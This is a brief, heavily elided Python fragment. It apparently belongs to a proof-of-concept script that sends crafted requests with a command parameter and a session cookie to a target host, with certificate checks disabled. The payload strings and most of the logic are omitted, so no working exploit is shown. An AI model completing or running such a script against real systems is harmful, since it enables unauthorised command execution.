...
def pr(host,cmd):
    ...
    url=host
    try:
        response1=requests.get(url=url+payload,headers=headers1,verify=False,timeout=10)
        ...
        headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                   "Cookie": cookie}
        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=10)
        if response.text != '':
